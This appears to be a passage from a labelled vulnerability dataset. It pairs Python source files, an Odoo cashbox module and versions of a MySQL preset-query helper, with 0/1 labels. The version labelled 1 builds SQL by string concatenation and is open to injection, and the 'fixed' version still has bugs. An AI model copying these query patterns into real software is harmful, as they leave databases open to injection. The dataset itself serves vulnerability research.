            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for ""%s"". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute("""""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1"""""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute(""INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')""%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute(""select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'""%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print ""statement_id"",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': ""[('id','in', [""+','.join(map(str,list_statement))+""])]"",
            'domain': ""[('state','=','open')]"",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:
/n/n/n",1
198,198,6508e10dfe391cf2ffda8a6a546dba0716d8c70c,"src/presetquery.py/n/nimport pyxl
import mysql.connector

import database

from pypika import MySQLQuery, Table, Field

def write_preset(query_text, query_desc):
    # to use this method you must pass in a connection,
    # a preset query, and a description of what the query achieves
    # it will automatically write it to the bottom of the table

    conn = database.get_db_connection()
    conn.autocommit = True

    extable = Table('Presets')
    q = MySQLQuery.into(extable).columns(""querval"", ""description"").insert(query_text, query_desc)
    quer = str(q)

    cursor.execute(quer)

    conn.close()

def edit_preset(query_id, query_text, description):
    '''(int, str, str) -> None'''
    # to use this method you must pass in a connection,
    # the id of a preset query,
    # a preset query, and a description of what the query achieves
    # it will update the query and description at the given id with new values.
    # if queryin or descriptin = ""NA"" then it will not update the values written so

    conn = database.get_db_connection()
    conn.autocommit = False

    cursor = conn.cursor()
    # quer = ""ALTER TABLE Presets DROP COLUMN id""
    # cursor.execute(quer)
    # quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST""
    # cursor.execute(quer)

    quer = ""UPDATE Presets SET querval=%s AND description=%s WHERE id=%s""
    cursor.execute(quer, (query_text, description, query_id))

    # quer = ""ALTER TABLE Presets DROP COLUMN id""
    # cursor.execute(quer)
    # quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST""
    # cursor.execute(quer)

    conn.close()

def remove_preset(conn, key):
    # to use this method you must pass in a connection, and
    # what number the preset's id is
    cursor = conn.cursor()
    quer = ""ALTER TABLE Presets DROP COLUMN id""
    cursor.execute(quer)
    quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST""
    cursor.execute(quer)

    quer = ""DELETE FROM Presets WHERE id = %s""
    cursor.execute(quer, (key,))

    quer = ""ALTER TABLE Presets DROP COLUMN id""
    cursor.execute(quer)
    quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST""
    cursor.execute(quer)
/n/n/n",0
199,199,6508e10dfe391cf2ffda8a6a546dba0716d8c70c,"/src/presetquery.py/n/nimport pyxl
import mysql.connector

from pypika import MySQLQuery, Table, Field

	# the use of this function assumes there exists some Table
	# called 'Presets' where the first column is an
	# UNSIGNED AUTO_INCREMENT PRIMARY KEY labeled 'id'
	# and the second column is a VARCHAR NOT NULL labeled 'querval'
	# and the third column is a VARCHAR NOT NULL labeled 'description'

def write_preset(conn, queryin, descriptin):
	# to use this method you must pass in a connection,
	# a preset query, and a description of what the query achieves
	# it will automatically write it to the bottom of the table
	cursor = conn.cursor()
	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

	extable = Table('Presets')
	q = MySQLQuery.into(extable).columns(""querval"", ""description"").insert(queryin, descriptin)
	print(q)
	quer = str(q)

	cursor.execute(quer)

	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

def edit_preset(conn, key, queryin, descriptin):
	# to use this method you must pass in a connection,
	# the id of a preset query,
	# a preset query, and a description of what the query achieves
	# it will update the query and description at the given id with new values.
	# if queryin or descriptin = ""NA"" then it will not update the values written so
	cursor = conn.cursor()
	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

	if (queryin != ""NA""):
		quer = ""UPDATE Presets SET querval='""+queryin+""' WHERE id=""+str(key)+"";""
		cursor.execute(quer)
	if (descriptin != ""NA""):
		quer = ""UPDATE Presets SET description='""+descriptin+""' WHERE id=""+str(key)+"";""
		cursor.execute(quer)

	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

def remove_preset(conn, key):
	# to use this method you must pass in a connection, and
	# what number the preset's id is
	cursor = conn.cursor()
	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

	quer = ""DELETE FROM Presets WHERE id = "" +key;
	cursor.execute(quer)

	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

def get_preset(conn, key):
	# to use this method you must pass in a connection
	# and the id for the corresponding querval to return
	# The querval returned is formatted to be ready to use
	# as a query
	cursor = conn.cursor()
	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

	extable = Table('Presets')
	q = MySQLQuery.from_(extable).select(
		extable.querval
	).where(
		extable.id == key
	)
	print(q)
	quer = str(q)

	cursor.execute(quer)

	row = cursor.fetchone()
	strrow = str(row)

	return (strrow[2:-3])

def get_descriptin(conn, key):
	# to use this method you must pass in a connection
	# and the id for the corresponding description to return
	# The description returned is formatted to be ready to displayed
	cursor = conn.cursor()
	quer = ""ALTER TABLE Presets DROP COLUMN id;""
	cursor.execute(quer)
	quer = ""ALTER TABLE Presets ADD COLUMN id INT AUTO_INCREMENT PRIMARY KEY NOT NULL FIRST;""
	cursor.execute(quer)

	extable = Table('Presets')
	q = MySQLQuery.from_(extable).select(
		extable.description
	).where(
		extable.id == key
	)
	print(q)
	quer = str(q)

	cursor.execute(quer)

	row = cursor.fetchone()
	strrow = str(row)

	return (strrow[2:-3])
/n/n/n",1
